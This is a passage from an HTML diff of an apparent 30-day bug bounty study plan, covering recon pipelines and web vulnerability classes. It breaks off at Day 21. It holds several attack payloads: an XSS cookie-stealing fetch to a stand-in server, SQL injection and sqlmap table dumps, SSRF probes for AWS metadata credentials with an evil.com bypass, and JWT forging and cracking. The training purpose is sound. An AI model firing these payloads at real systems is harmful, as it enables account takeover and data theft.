+            <div class="section-block">
+              <div class="block-label lbl-amber">Today's Tasks</div>
+              <ul class="items">
+                <li>Read the full OWASP Top 10 (2021) — owasp.org/Top10 — not just the names, read every entry</li>
+                <li>For each OWASP category: write one sentence on how you'd find it in a real app (in your notes)</li>
+                <li>Review your chosen program's scope again with OWASP in mind — which categories are likely present?</li>
+                <li>Set up your wordlist library: install seclists (apt install seclists) — this is your ammo for the next 23 days</li>
+                <li>Write your "hunting checklist" — a personal list of the first 10 things you check on any new target</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-teal">Week 1 Gate Check</div>
+              <div class="outcome-inline">✓ Lab running · ✓ Burp configured · ✓ Program chosen + scope read · ✓ Note system active · ✓ OWASP Top 10 read · ✓ 10+ disclosed reports read · ✓ Personal hunting checklist written</div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div><!-- /w1 -->
+
+
+    <!-- ══════════════════ WEEK 2 ══════════════════ -->
+    <div class="week-panel" id="w2">
+      <div class="week-hero">
+        <div class="week-meta">
+          <span class="week-phase-tag">Phase 2 · Skill Build</span>
+          <span class="week-range">Days 8 – 14</span>
+        </div>
+        <h2>Recon Mastery — Build Your Attack Surface Map</h2>
+        <p class="week-objective">Recon is where the money is. The hunter who builds the most complete target map finds bugs others miss. This week you master every recon layer: subdomains, endpoints, parameters, JS files, historical data, and tech fingerprinting.</p>
+        <div class="outcome-box">
+          <span class="outcome-icon">🎯</span>
+          <div class="outcome-text">
+            <strong>Week 2 Outcome</strong>
+            You can run a full automated + manual recon pipeline on any target in under 2 hours and produce a structured attack surface map with 50+ unique endpoints, discovered parameters, and technology stack identified.
+          </div>
+        </div>
+      </div>
+
+      <div class="days-stack">
+
+        <!-- DAY 8 -->
+        <div class="day-card" id="d8">
+          <div class="day-header" onclick="toggleDay('d8')">
+            <span class="day-num">DAY 08</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d8')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Subdomain Enumeration — Layer 1 of Recon</div>
+              <div class="day-sub">subfinder, amass, dnsx, httpx — building the asset list</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-recon">Recon</span><span class="tag tag-tool">Tools</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-purple">Recon Pipeline — Subdomains</div>
+              <div class="code">
+<span class="cm"># Step 1: Passive subdomain discovery</span>
+<span class="gr">subfinder -d target.com -o subs_passive.txt -silent</span>
+<span class="gr">amass enum -passive -d target.com -o subs_amass.txt</span>
+
+<span class="cm"># Step 2: DNS brute force (active — check scope first)</span>
+<span class="gr">ffuf -u https://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403</span>
+
+<span class="cm"># Step 3: Merge and deduplicate</span>
+<span class="gr">cat subs_passive.txt subs_amass.txt | sort -u > all_subs.txt</span>
+
+<span class="cm"># Step 4: Resolve live hosts</span>
+<span class="gr">cat all_subs.txt | dnsx -silent -o live_subs.txt</span>
+
+<span class="cm"># Step 5: Probe for HTTP/S services</span>
+<span class="gr">cat live_subs.txt | httpx -title -status-code -tech-detect -o live_web.txt</span>
+
+<span class="cm"># Step 6: Screenshot everything</span>
+<span class="gr">cat live_web.txt | gowitness file -f - -P ./screenshots/</span>
+              </div>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">What to Look For in Results</div>
+              <ul class="items">
+                <li>Staging/dev/qa subdomains — less hardened, often forgotten</li>
+                <li>Admin panels — admin., backstage., internal., manage.</li>
+                <li>API subdomains — api., api-v2., rest., graphql.</li>
+                <li>Old subdomains with outdated software versions</li>
+                <li>403 responses — these are often bypassable (worth noting)</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 9 -->
+        <div class="day-card" id="d9">
+          <div class="day-header" onclick="toggleDay('d9')">
+            <span class="day-num">DAY 09</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d9')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Endpoint Discovery — Directories, Parameters &amp; APIs</div>
+              <div class="day-sub">ffuf, katana, waybackurls, gf patterns</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-recon">Recon</span><span class="tag tag-tool">Tools</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-purple">Endpoint Discovery Pipeline</div>
+              <div class="code">
+<span class="cm"># Directory fuzzing</span>
+<span class="gr">ffuf -u https://target.com/FUZZ \</span>
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  -mc 200,201,301,302,403 -o dirs.json
+
+<span class="cm"># Crawl live URLs</span>
+<span class="gr">katana -u https://target.com -d 5 -o crawl.txt</span>
+<span class="gr">echo target.com | waybackurls | sort -u > wayback.txt</span>
+<span class="gr">echo target.com | gau --mc 200 >> wayback.txt</span>
+
+<span class="cm"># Filter interesting params with gf</span>
+<span class="gr">cat wayback.txt | gf xss > potential_xss.txt</span>
+<span class="gr">cat wayback.txt | gf sqli > potential_sqli.txt</span>
+<span class="gr">cat wayback.txt | gf redirect > potential_redirect.txt</span>
+<span class="gr">cat wayback.txt | gf ssrf > potential_ssrf.txt</span>
+
+<span class="cm"># Find API endpoints</span>
+<span class="gr">cat crawl.txt wayback.txt | grep -i "api\|v1\|v2\|graphql\|rest" | sort -u</span>
+              </div>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-teal">Outcome Check</div>
+              <div class="outcome-inline">You have a list of 50+ unique URLs, categorized by type (directories, API endpoints, parameterized URLs). You've run gf patterns and have lists of potential vulnerability locations to test next week.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 10 -->
+        <div class="day-card" id="d10">
+          <div class="day-header" onclick="toggleDay('d10')">
+            <span class="day-num">DAY 10</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d10')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">JavaScript Recon — Secrets Hidden in Plain Sight</div>
+              <div class="day-sub">JS file analysis, secret extraction, hidden endpoints</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-recon">Recon</span><span class="tag tag-vuln">Secrets</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">JavaScript files are goldmines. Developers embed API keys, internal endpoints, auth tokens, and business logic directly in client-side JS. This is one of the highest-signal, lowest-competition recon steps because most hunters skip it.</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-purple">JS Recon Pipeline</div>
+              <div class="code">
+<span class="cm"># Extract all JS files from target</span>
+<span class="gr">cat crawl.txt | grep "\.js$" | sort -u > jsfiles.txt</span>
+<span class="gr">cat wayback.txt | grep "\.js$" >> jsfiles.txt</span>
+
+<span class="cm"># Download all JS files</span>
+<span class="gr">cat jsfiles.txt | xargs -I{} wget -q {} -P ./js_files/</span>
+
+<span class="cm"># Scan for secrets with secretfinder</span>
+<span class="gr">python3 SecretFinder.py -i https://target.com -e -o results.html</span>
+
+<span class="cm"># Grep for common secrets manually</span>
+<span class="gr">grep -rEi "api[_-]?key|secret|token|password|auth|bearer|aws|s3" ./js_files/</span>
+
+<span class="cm"># Find hidden endpoints in JS</span>
+<span class="gr">cat jsfiles.txt | xargs -I{} curl -s {} | grep -oE "(['\"])/[a-zA-Z0-9_/.-]+" | sort -u</span>
+
+<span class="cm"># Use LinkFinder for structured extraction</span>
+<span class="gr">python3 linkfinder.py -i https://target.com -d -o results.html</span>
+              </div>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">What to Flag</div>
+              <ul class="items">
+                <li>Hardcoded API keys (AWS, Google Maps, Stripe, Twilio, SendGrid)</li>
+                <li>Internal API endpoints not exposed in the main site map</li>
+                <li>Debug/test endpoints left in production JS</li>
+                <li>Authentication logic — look for JWT handling, session checks</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 11 -->
+        <div class="day-card" id="d11">
+          <div class="day-header" onclick="toggleDay('d11')">
+            <span class="day-num">DAY 11</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d11')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">OSINT &amp; Passive Recon — Intel Before You Touch Anything</div>
+              <div class="day-sub">Shodan, Google Dorks, GitHub recon, certificate transparency</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-recon">OSINT</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-purple">OSINT Checklist</div>
+              <ul class="items">
+                <li><strong>Certificate Transparency (crt.sh):</strong> <code style="font-family:var(--mono);font-size:11px;color:var(--amber)">https://crt.sh/?q=%.target.com</code> — finds subdomains from SSL certs</li>
+                <li><strong>Shodan:</strong> Search <code style="font-family:var(--mono);font-size:11px;color:var(--amber)">org:"Target Company"</code> — find exposed servers, ports, services, banners</li>
+                <li><strong>Google Dorks:</strong> site:target.com filetype:env | filetype:sql | filetype:log | inurl:config</li>
+                <li><strong>GitHub Recon:</strong> Search <code style="font-family:var(--mono);font-size:11px;color:var(--amber)">target.com API_KEY</code> in GitHub — leaked credentials are common</li>
+                <li><strong>Wayback Machine:</strong> Find old login pages, removed features, legacy API versions</li>
+                <li><strong>LinkedIn:</strong> Find tech stack from job postings (they reveal what they're running)</li>
+                <li><strong>SecurityTrails / VirusTotal:</strong> Historical DNS, IP history, related domains</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">GitHub Dork Examples</div>
+              <div class="code">
+<span class="cm"># GitHub search queries (use site:github.com in Google)</span>
+"target.com" password
+"target.com" secret_key
+"target.com" api_key
+"@target.com" password
+filename:.env target.com
+filename:config.php target.com
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 12 -->
+        <div class="day-card" id="d12">
+          <div class="day-header" onclick="toggleDay('d12')">
+            <span class="day-num">DAY 12</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d12')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Technology Fingerprinting &amp; Attack Surface Mapping</div>
+              <div class="day-sub">Wappalyzer, headers, server banners, CMS detection</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-recon">Recon</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">Technology determines vulnerability classes. WordPress → look for plugin vulns. Java Spring → look for SSTI, actuator exposure. GraphQL → look for introspection, batching attacks. Knowing the stack before testing saves hours.</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-purple">Fingerprinting Commands</div>
+              <div class="code">
+<span class="cm"># whatweb — CLI fingerprinting</span>
+<span class="gr">whatweb https://target.com -v</span>
+
+<span class="cm"># httpx with tech detection</span>
+<span class="gr">echo target.com | httpx -tech-detect -status-code -title</span>
+
+<span class="cm"># Check response headers for tech clues</span>
+<span class="gr">curl -sI https://target.com | grep -i "server\|x-powered-by\|x-aspnet\|x-generator"</span>
+
+<span class="cm"># nuclei — tech detection templates</span>
+<span class="gr">nuclei -u https://target.com -t technologies/ -silent</span>
+
+<span class="cm"># Check for exposed admin panels</span>
+<span class="gr">ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \</span>
+  -mc 200,302 -fl 0
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 13 -->
+        <div class="day-card" id="d13">
+          <div class="day-header" onclick="toggleDay('d13')">
+            <span class="day-num">DAY 13</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d13')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Nuclei — Automated Vulnerability Scanning at Scale</div>
+              <div class="day-sub">Templates, custom rules, what to trust vs manually verify</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-tool">Tools</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-purple">Nuclei Workflow</div>
+              <div class="code">
+<span class="cm"># Update templates</span>
+<span class="gr">nuclei -update-templates</span>
+
+<span class="cm"># Run against single target (high-severity only)</span>
+<span class="gr">nuclei -u https://target.com -severity critical,high -o nuclei_findings.txt</span>
+
+<span class="cm"># Run against full subdomain list</span>
+<span class="gr">nuclei -l live_web.txt -severity critical,high,medium -o nuclei_all.txt -rate-limit 50</span>
+
+<span class="cm"># Specific template categories</span>
+<span class="gr">nuclei -u https://target.com -t exposures/ -t misconfiguration/ -t cves/</span>
+
+<span class="cm"># Custom template for exposed endpoints</span>
+<span class="gr">nuclei -u https://target.com -t /path/to/custom-template.yaml</span>
+              </div>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-red">Critical Warning</div>
+              <div class="warn-inline">Never submit a Nuclei finding without manually verifying it. False positive rate is significant. Submitting auto-scanner output without proof is the fastest way to get a reputation for noise — programs stop taking you seriously.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 14 -->
+        <div class="day-card" id="d14">
+          <div class="day-header" onclick="toggleDay('d14')">
+            <span class="day-num">DAY 14</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d14')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Build Your Personal Recon Automation Script</div>
+              <div class="day-sub">Tie the full pipeline into a shell script you run on every target</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-recon">Recon</span><span class="tag tag-tool">Build</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">Automating recon means you can run it on a new target in the background while you manually hunt another. Professional hunters have custom pipelines that reduce recon time from 3hrs to 20 minutes.</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-purple">Your recon.sh Skeleton</div>
+              <div class="code">
+<span class="rd">#!/bin/bash</span>
+<span class="tl">TARGET=$1</span>
+<span class="tl">OUTDIR="./recon_$TARGET"</span>
+mkdir -p $OUTDIR/{subs,endpoints,js,screenshots}
+
+<span class="cm"># 1. Subdomain enum</span>
+subfinder -d $TARGET -silent | sort -u > $OUTDIR/subs/passive.txt
+cat $OUTDIR/subs/passive.txt | dnsx -silent > $OUTDIR/subs/live.txt
+
+<span class="cm"># 2. HTTP probe</span>
+cat $OUTDIR/subs/live.txt | httpx -silent -title -status-code > $OUTDIR/live_web.txt
+
+<span class="cm"># 3. Endpoint discovery</span>
+katana -list $OUTDIR/live_web.txt -d 3 -silent > $OUTDIR/endpoints/crawl.txt
+cat $OUTDIR/subs/live.txt | waybackurls >> $OUTDIR/endpoints/crawl.txt
+
+<span class="cm"># 4. GF patterns</span>
+cat $OUTDIR/endpoints/crawl.txt | gf xss > $OUTDIR/endpoints/xss_params.txt
+cat $OUTDIR/endpoints/crawl.txt | gf sqli > $OUTDIR/endpoints/sqli_params.txt
+
+<span class="cm"># 5. Nuclei fast scan</span>
+nuclei -l $OUTDIR/live_web.txt -severity critical,high -silent -o $OUTDIR/nuclei.txt
+
+<span class="gr">echo "[+] Recon complete: $OUTDIR"</span>
+              </div>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-teal">Week 2 Gate Check</div>
+              <div class="outcome-inline">✓ Full recon pipeline runs on your chosen target · ✓ 50+ endpoints discovered · ✓ JS files analyzed · ✓ OSINT completed · ✓ recon.sh script works end-to-end · ✓ Attack surface map documented in notes</div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div><!-- /w2 -->
+
+
+    <!-- ══════════════════ WEEK 3 ══════════════════ -->
+    <div class="week-panel" id="w3">
+      <div class="week-hero">
+        <div class="week-meta">
+          <span class="week-phase-tag">Phase 2 · Skill Build</span>
+          <span class="week-range">Days 15 – 21</span>
+        </div>
+        <h2>Vulnerability Deep Dives — The Techniques That Pay</h2>
+        <p class="week-objective">One vulnerability class per day. Not surface-level theory — real payloads, real bypasses, and real PortSwigger labs. By the end of this week you'll have hands-on competency in the 7 bug classes that account for the majority of bug bounty payouts.</p>
+        <div class="outcome-box">
+          <span class="outcome-icon">🎯</span>
+          <div class="outcome-text">
+            <strong>Week 3 Outcome</strong>
+            You can manually test for IDOR, XSS, SQLi, SSRF, XXE, Auth Bypass, and Open Redirect. You've completed at least 15 PortSwigger Academy labs. You've identified at least one potential vulnerability in your chosen program.
+          </div>
+        </div>
+      </div>
+
+      <div class="days-stack">
+
+        <!-- DAY 15 -->
+        <div class="day-card" id="d15">
+          <div class="day-header" onclick="toggleDay('d15')">
+            <span class="day-num">DAY 15</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d15')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">IDOR — The #1 Bug Bounty Finding</div>
+              <div class="day-sub">Object reference manipulation, horizontal + vertical escalation</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-vuln">Vuln</span><span class="tag tag-live">High Payout</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">IDOR (Insecure Direct Object Reference) is the most consistently paid vulnerability in bug bounty. Why? It's everywhere, developers constantly miss it, and the impact is direct — you access other users' data. It's the "find and report" vulnerability.</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">IDOR Attack Vectors</div>
+              <ul class="items">
+                <li><strong>Numeric IDs:</strong> /api/user/1001 → try 1000, 1002, 999 — can you see other users?</li>
+                <li><strong>GUIDs:</strong> Not safe by default. Find a GUID in response, try in another account's context</li>
+                <li><strong>Encoded references:</strong> Base64 decode parameters — often hides user_id=123</li>
+                <li><strong>API endpoints:</strong> POST /api/order/delete {"order_id": "12345"} — change ID to another user's order</li>
+                <li><strong>File downloads:</strong> /download?file=report_user123.pdf → enumerate other users' reports</li>
+                <li><strong>Autorize workflow:</strong> Log in as User A → copy session cookie to Autorize → browse as User B → Autorize auto-tests every request with User A's token</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Testing Methodology</div>
+              <div class="code">
+<span class="cm"># 1. Create two accounts (attacker + victim)</span>
+<span class="cm"># 2. As victim: perform action (create order, upload file, update profile)</span>
+<span class="cm"># 3. Note the object ID in the request</span>
+<span class="cm"># 4. As attacker: replay the request with victim's object ID</span>
+
+<span class="cm"># Example: Profile access IDOR</span>
+GET /api/v1/users/<span class="hl">victim_id</span>/profile
+Authorization: Bearer <span class="tl">attacker_token</span>
+
+<span class="cm"># If response contains victim's data = IDOR confirmed</span>
+<span class="cm"># Document: request, response, both account contexts</span>
+              </div>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-teal">Lab</div>
+              <div class="outcome-inline">Complete all IDOR labs on PortSwigger Web Security Academy (free). Then test your chosen program's API endpoints for IDOR using two test accounts.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 16 -->
+        <div class="day-card" id="d16">
+          <div class="day-header" onclick="toggleDay('d16')">
+            <span class="day-num">DAY 16</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d16')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">XSS — Cross-Site Scripting in Depth</div>
+              <div class="day-sub">Reflected, Stored, DOM — context-aware payloads, CSP bypass</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-vuln">Vuln</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-blue">XSS Payload Ladder</div>
+              <div class="code">
+<span class="cm"># Context 1: HTML body</span>
+<span class="hl">&lt;script&gt;alert(1)&lt;/script&gt;</span>
+<span class="hl">&lt;img src=x onerror=alert(1)&gt;</span>
+<span class="hl">&lt;svg/onload=alert(1)&gt;</span>
+
+<span class="cm"># Context 2: Inside attribute</span>
+<span class="hl">" onmouseover="alert(1)</span>
+<span class="hl">' autofocus onfocus='alert(1)</span>
+
+<span class="cm"># Context 3: Inside JS string</span>
+<span class="hl">'-alert(1)-'</span>
+<span class="hl">\'-alert(1)//</span>
+
+<span class="cm"># Context 4: URL/href</span>
+<span class="hl">javascript:alert(1)</span>
+
+<span class="cm"># Impact escalation: cookie theft (Stored XSS)</span>
+<span class="hl">&lt;script&gt;fetch('https://your-server/?c='+document.cookie)&lt;/script&gt;</span>
+
+<span class="cm"># DOM XSS — check sources: location.hash, document.referrer, URLSearchParams</span>
+<span class="cm"># Sinks: innerHTML, document.write, eval, location.href</span>
+              </div>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Where to Hunt XSS</div>
+              <ul class="items">
+                <li>Search boxes, user profile fields, comment sections</li>
+                <li>Error messages that reflect user input</li>
+                <li>URL parameters that appear in page output</li>
+                <li>Import/upload features that display file names</li>
+                <li>Email fields in "forgot password" that appear in error messages</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-teal">Labs</div>
+              <div class="outcome-inline">Complete 5 XSS labs on PortSwigger Academy covering all three types. Use your gf xss output from Day 9 and test each parameter manually.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 17 -->
+        <div class="day-card" id="d17">
+          <div class="day-header" onclick="toggleDay('d17')">
+            <span class="day-num">DAY 17</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d17')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">SQL Injection — Manual First, Then Automate</div>
+              <div class="day-sub">Error-based, blind, time-based, SQLMap</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-vuln">Vuln</span><span class="tag tag-live">Critical</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-blue">SQLi Testing Sequence</div>
+              <div class="code">
+<span class="cm"># 1. Test for error (classic)</span>
+?id=1'
+?id=1"
+?id=1 AND 1=1--
+?id=1 AND 1=2--   <span class="cm"># Different response = SQLi</span>
+
+<span class="cm"># 2. Time-based blind (no error output)</span>
+?id=1; SELECT SLEEP(5)--
+?id=1' AND SLEEP(5)--   <span class="cm"># 5 sec delay = blind SQLi</span>
+
+<span class="cm"># 3. UNION extraction</span>
+?id=0 UNION SELECT 1,database(),3--
+?id=0 UNION SELECT 1,table_name,3 FROM information_schema.tables--
+
+<span class="cm"># 4. SQLMap (after manual confirmation only)</span>
+<span class="gr">sqlmap -u "https://target.com/item?id=1" --dbs --batch</span>
+<span class="gr">sqlmap -u "https://target.com/item?id=1" -D dbname --tables --batch</span>
+<span class="gr">sqlmap -u "https://target.com/item?id=1" -D dbname -T users --dump --batch</span>
+
+<span class="cm"># For POST requests</span>
+<span class="gr">sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --dbs</span>
+              </div>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-red">Where to Look</div>
+              <ul class="items">
+                <li>Your gf sqli list from Day 9 — start there</li>
+                <li>Search, filter, sort parameters</li>
+                <li>Login forms (username + password fields)</li>
+                <li>Any parameter that queries a database (product IDs, category filters, user IDs)</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 18 -->
+        <div class="day-card" id="d18">
+          <div class="day-header" onclick="toggleDay('d18')">
+            <span class="day-num">DAY 18</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d18')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">SSRF — Server-Side Request Forgery</div>
+              <div class="day-sub">Cloud metadata, internal services, blind SSRF, Burp Collaborator</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-vuln">Vuln</span><span class="tag tag-live">Critical</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">SSRF makes the server fetch URLs you control. In cloud environments (AWS, GCP, Azure) this means accessing the metadata endpoint at 169.254.169.254 and stealing IAM credentials. A single SSRF in the right place is a Critical finding worth $10,000+.</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">SSRF Testing Payloads</div>
+              <div class="code">
+<span class="cm"># Where to look: any URL parameter</span>
+?url=  ?redirect=  ?load=  ?fetch=  ?src=  ?href=
+
+<span class="cm"># AWS metadata endpoint (Critical if server is on AWS)</span>
+<span class="hl">http://169.254.169.254/latest/meta-data/</span>
+<span class="hl">http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
+
+<span class="cm"># Internal network probing</span>
+<span class="hl">http://localhost/</span>
+<span class="hl">http://127.0.0.1:8080/</span>
+<span class="hl">http://internal-api.company.com/</span>
+
+<span class="cm"># Blind SSRF — use Burp Collaborator or interactsh</span>
+<span class="gr">interactsh-client  # starts a listener</span>
+<span class="cm"># Use generated URL as payload — watch for DNS/HTTP callbacks</span>
+
+<span class="cm"># Bypass attempts (if direct blocked)</span>
+<span class="hl">http://169.254.169.254@evil.com  </span><span class="cm"># @ bypass</span>
+<span class="hl">http://[::ffff:169.254.169.254]  </span><span class="cm"># IPv6</span>
+<span class="hl">http://0xA9FEA9FE                </span><span class="cm"># Hex IP</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 19 -->
+        <div class="day-card" id="d19">
+          <div class="day-header" onclick="toggleDay('d19')">
+            <span class="day-num">DAY 19</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d19')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Authentication Bugs — Account Takeover Techniques</div>
+              <div class="day-sub">Password reset flaws, JWT attacks, OAuth misconfig, 2FA bypass</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-vuln">Vuln</span><span class="tag tag-live">Critical</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-blue">ATO Attack Surface</div>
+              <ul class="items">
+                <li><strong>Password reset token predictability:</strong> Request multiple resets — is the token random? Sequential? Time-based?</li>
+                <li><strong>Host header injection in reset email:</strong> Change Host header → reset link goes to your server with victim's token</li>
+                <li><strong>JWT attacks:</strong> Change alg to "none" → remove signature. Or crack weak HS256 secret with hashcat</li>
+                <li><strong>OAuth state parameter missing:</strong> CSRF on OAuth flow = account takeover</li>
+                <li><strong>2FA bypass:</strong> Does the app enforce 2FA on API endpoints? On mobile endpoints? Test all auth paths independently</li>
+                <li><strong>Username enumeration:</strong> Different error messages for valid vs invalid usernames → enables targeted attacks</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">JWT Testing</div>
+              <div class="code">
+<span class="cm"># Decode JWT (no library needed)</span>
+echo "eyJ..." | cut -d. -f2 | base64 -d 2>/dev/null | jq
+
+<span class="cm"># Test alg:none bypass</span>
+<span class="cm"># 1. Decode header: {"alg":"HS256","typ":"JWT"}</span>
+<span class="cm"># 2. Change to: {"alg":"none","typ":"JWT"}</span>
+<span class="cm"># 3. Re-encode, remove signature, add trailing dot</span>
+<span class="cm"># 4. Send modified token</span>
+
+<span class="cm"># Crack HS256 secret</span>
+<span class="gr">hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 20 -->
+        <div class="day-card" id="d20">
+          <div class="day-header" onclick="toggleDay('d20')">
+            <span class="day-num">DAY 20</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d20')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">Business Logic Flaws — The Unautomatable Bugs</div>
+              <div class="day-sub">Price manipulation, workflow bypass, race conditions</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-vuln">Vuln</span><span class="tag tag-mindset">Manual</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-amber">What &amp; Why</div>
+              <p class="prose">Business logic bugs can't be found by scanners — they require understanding what the application is supposed to do and finding cases where it doesn't enforce those rules. These bugs are often Critical and almost never duplicated because they require deep application knowledge.</p>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Test These Scenarios</div>
+              <ul class="items">
+                <li><strong>Price manipulation:</strong> Negative quantities, changing price parameters in POST body, coupon stacking, currency confusion</li>
+                <li><strong>Workflow bypass:</strong> Can you skip step 2 of a 3-step checkout? Access step 3 directly?</li>
+                <li><strong>Race conditions:</strong> Send 50 simultaneous requests to redeem a single-use coupon — does it apply multiple times?</li>
+                <li><strong>Privilege escalation via parameter:</strong> Is role/admin/is_admin sent client-side? Try changing it.</li>
+                <li><strong>Mass assignment:</strong> In registration POST body, add fields like "role":"admin" — does the server accept it?</li>
+                <li><strong>Discount abuse:</strong> Apply 100% discount code. Apply expired promo. Apply codes beyond their limit.</li>
+              </ul>
+            </div>
+            <div class="section-block">
+              <div class="block-label lbl-blue">Race Condition with Turbo Intruder</div>
+              <div class="code">
+<span class="cm"># In Burp: right-click request → Extensions → Turbo Intruder</span>
+<span class="cm"># Use the race condition template</span>
+<span class="cm"># Send 50 parallel requests simultaneously</span>
+<span class="cm"># Watch for: different success responses, multiple DB writes</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- DAY 21 -->
+        <div class="day-card" id="d21">
+          <div class="day-header" onclick="toggleDay('d21')">
+            <span class="day-num">DAY 21</span>
+            <div class="day-checkbox" onclick="checkDay(event,'d21')">✓</div>
+            <div class="day-title-wrap">
+              <div class="day-title">XXE, SSTI, Open Redirect, Path Traversal</div>
+              <div class="day-sub">Four more critical classes — recognize the trigger conditions</div>
+            </div>
+            <div class="day-tags"><span class="tag tag-vuln">Vuln</span></div>
+            <span class="chevron">▼</span>
+          </div>
+          <div class="day-body">
+            <div class="section-block">
+              <div class="block-label lbl-blue">Four Vulnerability Quick Reference</div>
